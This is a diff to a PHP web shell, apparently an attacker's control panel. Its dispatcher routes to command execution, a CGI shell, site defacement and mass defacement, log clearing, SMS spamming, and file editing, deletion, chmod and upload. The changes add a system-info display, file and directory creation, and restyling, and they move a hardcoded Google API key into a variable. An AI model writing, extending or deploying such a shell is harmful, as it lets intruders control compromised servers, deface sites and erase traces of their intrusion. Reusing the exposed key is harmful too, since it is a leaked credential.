@@ -101,7 +101,7 @@ if (!isset($_SESSION[md5(sha1($_SERVER['HTTP_HOST'])) ])) {
 	<meta charset="utf-8" />
 	<meta http-equiv="X-UA-Compatible" content="IE=edge" />
 	<meta name="viewport" content="width=device-width, initial-scale=1.0" />
-	<link rel="shortcut icon" href="https://www.hackthebox.eu/images/favicon.png" />
+	<link rel="shortcut icon" href="https://cvar1984.github.io/favicon.png" />
 	<link href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css" rel="stylesheet" />
 	<script src="https://ajax.googleapis.com/ajax/libs/jquery/1.11.3/jquery.min.js" type="text/javascript"></script>
 	<script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js" type="text/javascript"></script>
@@ -110,7 +110,7 @@ if (!isset($_SESSION[md5(sha1($_SERVER['HTTP_HOST'])) ])) {
 		background: black;
 		color: lavender;
 		text-shadow: 2px 2px 4px #000000;
-		background: url(https://cvar1984.github.io/bg.jpg) no-repeat center center fixed;
+		background: url(https://cvar1984.github.io/bg-2.jpg) no-repeat center center fixed;
 		-webkit-background-size: cover;
 		-moz-background-size: cover;
 		-o-background-size: cover;
@@ -139,13 +139,13 @@ if (!isset($_SESSION[md5(sha1($_SERVER['HTTP_HOST'])) ])) {
 	}
 
 	a:hover {
-		color: red;
+		color: black;
 	}
 
 	table,
 	tr,
 	td {
-		border: 1px
+		border: 1px 
 	}
 
 	.table-hover {
@@ -165,6 +165,7 @@ if (!isset($_SESSION[md5(sha1($_SERVER['HTTP_HOST'])) ])) {
 		height: 500px;
 		font-family: Arial, Helvetica, monospace;
 		color: lavender;
+		border: 1px solid lime;
 	}
 
 	#input {
@@ -172,6 +173,7 @@ if (!isset($_SESSION[md5(sha1($_SERVER['HTTP_HOST'])) ])) {
 		width: 250px;
 		font-family: Arial, Helvetica, monospace;
 		color: lavender;
+		border: 1px solid lime;
 	}
 
 	#menu {}
@@ -283,7 +285,7 @@ function music() {
 }
 
 function jumping() {
-	alert("This feature under developmen");
+	alert("This feature under development");
 }
 
 function config() {
@@ -364,7 +366,7 @@ function config() {
 }
 
 function mass_deface() {
-	alert("This feature under developmen");
+	alert("This feature under development");
 }
 
 function info() {
@@ -375,7 +377,9 @@ function info() {
 		$dist = ini_get('disable_functions');
 	}
 ?>
-   <center><h5>Disabled Function : <?php echo $dist; ?> </h5>
+   <center>
+   	<h5><?php echo php_uname();?></h5>
+   	<h5>Disabled Function : <?php echo $dist; ?> </h5>
 		<textarea class="form-control" id="textarea" readonly /><?php
 	print_r($_SERVER);
 ?></textarea>
@@ -438,7 +442,6 @@ function removeCustomAlert() {
 	top: 0px;
 	left: 0px;
 	z-index: 10000;
-	background-image: url(tp.png);
 	/* required by MSIE to prevent actions on lower z-index elements */
 }
 
@@ -871,9 +874,10 @@ function ngindex() {
 }
 
 function short_link() {
+	$mykey="AIzaSyDKvTCsXX3Vipbqyhj3a0JH1D3JYMuB5VM";
 	echo "<center><h2>Shortlink Generator</h2></center>";
 	if (isset($_POST['action'])) {
-		$param = "https://www.googleapis.com/urlshortener/v1/url?key=AIzaSyDKvTCsXX3Vipbqyhj3a0JH1D3JYMuB5VM";
+		$param = "https://www.googleapis.com/urlshortener/v1/url?key=$mykey";
 		$post = array(
 			"longUrl" => $_POST['link']
 		);
@@ -893,8 +897,7 @@ function short_link() {
 		curl_close($ch);
 		$json = json_decode($response);
 		if (isset($json->error)) {
-			echo $json
-				->error->message;
+			echo $json->error->message;
 		}
 		else {
 			echo "<center><textarea id='textarea' class='form-control' readonly>" . $json->id . "</textarea></center>";
@@ -921,6 +924,25 @@ function short_link() {
 	die();
 }
 
+function newdir($dir)
+{
+	if (@mkdir($dir . '/' . 'new_dir')) {
+		alert("Success");
+	}
+	else {
+		alert("Permission Denied Or File Exists");
+	}
+}
+
+function newfile($file)
+{
+	if (@touch($file . '/' . 'new_file.php')) {
+		alert("Success");
+	}
+	else {
+		alert("Permission Denied Or File Exists");
+	}
+}
 // END FUNCTION
 
 ?>
@@ -950,79 +972,79 @@ function short_link() {
 						Logout</a></li>
 		</ul>
 	</div>
-</nav><?php
-if (@$_GET['do'] == 'home') {
-	home();
-}
-elseif (@$_GET['do'] == 'sms') {
-	spamsms();
-}
-elseif (@$_GET['do'] == 'music') {
-	music();
-}
-elseif (@$_GET['do'] == 'jumping') {
-	jumping();
-}
-elseif (@$_GET['do'] == 'config') {
-	config();
-}
-elseif (@$_GET['do'] == 'mass_deface') {
-	mass_deface();
-}
-elseif (@$_GET['do'] == 'info') {
-	info();
-}
-elseif (@$_GET['do'] == 'logout') {
-	logout();
-}
-elseif (@$_GET['do'] == 'edit' and isset($_GET['files'])) {
-	edit($_GET['files']);
-}
-elseif (@$_GET['do'] == 'open' and isset($_GET['dir'])) {
-	$dir = $_GET['dir'];
-	chdir($dir);
-}
-elseif (@$_GET['do'] == 'view' and isset($_GET['files'])) {
-	open($_GET['files']);
-}
-elseif (@$_GET['do'] == 'delete' and isset($_GET['files'])) {
-	if (@hapus($_GET['files'])) {
-		alert("Success");
+</nav>
+<?php
+if(isset($_GET['do'])):
+	if ($_GET['do'] == 'home') {
+		home();
 	}
-	else {
-		alert("Permission Denied");
+	elseif ($_GET['do'] == 'sms') {
+		spamsms();
 	}
-}
-elseif (@$_GET['do'] == 'rename' and isset($_GET['files'])) {
-	renames($_GET['files']);
-}
-elseif (@$_GET['do'] == 'chmod' and isset($_GET['files'])) {
-	chmods($_GET['files']);
-}
-elseif (@$_GET['do'] == 'cmd') {
-	cmd_ui();
-}
-elseif (@$_GET['do'] == 'logs') {
-	clear_logs();
-}
-elseif (@$_GET['do'] == 'cgi') {
-	cgi_shell();
-}
-elseif (@$_GET['do'] == 'deface') {
-	ngindex();
-}
-elseif (@$_GET['do'] == 'shortlink') {
-	short_link();
-}
-elseif (@$_GET['do'] == 'new' and isset($_GET['dir'])) {
-	if (@mkdir($_GET['dir'] . '/' . 'new_dir')) {
-		alert("Success");
+	elseif ($_GET['do'] == 'music') {
+		music();
 	}
-	else {
-		alert("Permission Denied Or File Exists");
+	elseif ($_GET['do'] == 'jumping') {
+		jumping();
 	}
-}
-
+	elseif ($_GET['do'] == 'config') {
+		config();
+	}
+	elseif ($_GET['do'] == 'mass_deface') {
+		mass_deface();
+	}
+	elseif ($_GET['do'] == 'info') {
+		info();
+	}
+	elseif ($_GET['do'] == 'logout') {
+		logout();
+	}
+	elseif ($_GET['do'] == 'edit' and isset($_GET['files'])) {
+		edit($_GET['files']);
+	}
+	elseif ($_GET['do'] == 'open' and isset($_GET['dir'])) {
+		$dir = $_GET['dir'];
+		chdir($dir);
+	}
+	elseif ($_GET['do'] == 'view' and isset($_GET['files'])) {
+		open($_GET['files']);
+	}
+	elseif ($_GET['do'] == 'delete' and isset($_GET['files'])) {
+		if (@hapus($_GET['files'])) {
+			alert("Success");
+		}
+		else {
+			alert("Permission Denied");
+		}
+	}
+	elseif ($_GET['do'] == 'rename' and isset($_GET['files'])) {
+		renames($_GET['files']);
+	}
+	elseif ($_GET['do'] == 'chmod' and isset($_GET['files'])) {
+		chmods($_GET['files']);
+	}
+	elseif ($_GET['do'] == 'cmd') {
+		cmd_ui();
+	}
+	elseif ($_GET['do'] == 'logs') {
+		clear_logs();
+	}
+	elseif ($_GET['do'] == 'cgi') {
+		cgi_shell();
+	}
+	elseif ($_GET['do'] == 'deface') {
+		ngindex();
+	}
+	elseif ($_GET['do'] == 'shortlink') {
+		short_link();
+	}
+	elseif ($_GET['do'] == 'new' and isset($_GET['dir'])) {
+		newdir($_GET['dir']);
+	}
+	elseif($_GET['do'] == 'touch' and isset($_GET['files'])) {
+		newfile($_GET['files']);
+	}
+endif;
 $dir = scandir(getcwd());
 echo "<table width='70%' cellpadding='3' cellspacing='3' align='center' style='background:green;'>
 	<th style='background:green;float:left;width:200px;text-align:center;font-size:18px;'>Name</th>
@@ -1039,6 +1061,7 @@ foreach ($dir as $dir):
 		<td><img src='http://icons.iconarchive.com/icons/dakirby309/simply-styled/256/Blank-Folder-icon.png' class='icon'>";
 		echo "<a href='?do=open&dir=" . getcwd() . $sep . $dir . "'>$dir</a></td>";
 		echo "<td style='float:right;margin-right:7px;'>
+		<a class='btn btn-success btn-xs' href='?do=touch&files=" . getcwd() . $sep . dirname($dir) . "'>New File</a>
 		<a class='btn btn-success btn-xs' href='?do=new&dir=" . getcwd() . $sep . $dir . "'>New Dir</a>
 		<a class='btn btn-success btn-xs' href='?do=chmod&files=" . getcwd() . $sep . $dir . "'>Chmod</a>
 		<a class='btn btn-success btn-xs' href='?do=rename&files=" . getcwd() . $sep . $dir . "'>Rename</a> 
@@ -1048,6 +1071,7 @@ foreach ($dir as $dir):
 		echo "<td><img src='http://icons.iconarchive.com/icons/untergunter/leaf-mimes/512/text-plain-icon.png' class='icon'>";
 		echo "<a href='?do=view&files=" . getcwd() . $sep . $dir . "'>$dir</a></td>";
 		echo "<td style='float:right;margin-right:7px;'>
+		<a class='btn btn-success btn-xs' href='?do=touch&files=" . getcwd() . $sep . dirname($dir) . "'>New File</a>
 		<a class='btn btn-success btn-xs' href='?do=new&dir=" . getcwd() . $sep . dirname($dir) . "'>New Dir</a>
 		<a class='btn btn-success btn-xs' href='?do=chmod&files=" . getcwd() . $sep . $dir . "'>Chmod</a>
 		<a class='btn btn-success btn-xs' href='?do=rename&files=" . getcwd() . $sep . $dir . "'>Rename</a> 
@@ -1057,6 +1081,7 @@ foreach ($dir as $dir):
 		echo "<td><img src='http://icons.iconarchive.com/icons/untergunter/leaf-mimes/512/text-plain-icon.png' class='icon'>";
 		echo "<a href='?do=edit&files=" . getcwd() . $sep . $dir . "'>$dir</a></td>";
 		echo "<td style='float:right;margin-right:7px;'>
+		<a class='btn btn-success btn-xs' href='?do=touch&files=" . getcwd() . $sep . dirname($dir) . "'>New File</a>
 		<a class='btn btn-success btn-xs' href='?do=new&dir=" . getcwd() . $sep . dirname($dir) . "'>New Dir</a>
 		<a class='btn btn-success btn-xs' href='?do=chmod&files=" . getcwd() . $sep . $dir . "'>Chmod</a>
 		<a class='btn btn-success btn-xs' href='?do=rename&files=" . getcwd() . $sep . $dir . "'>Rename</a> 
@@ -1065,9 +1090,7 @@ foreach ($dir as $dir):
 ?>
 	</tr>
 	</table>
-<?php
-endforeach;
-?>
+<?php endforeach;?>
 <table width='70%' cellpadding='3' cellspacing='3' align='center'
 		style='background: green;'>
 		<th style='padding: 5px;' colspan='2'>
@@ -1089,7 +1112,7 @@ if (isset($_POST['upl'])) {
 ?>
 	<form method="post" enctype="multipart/form-data">
 		<center>
-			<input class="btn" id="input" type="file" name="file" />
+			<input class="btn" type="file" name="file" />
 			<input class="btn btn-danger" name="upl" type="submit" value="Save">
 		</center>
 	</form>
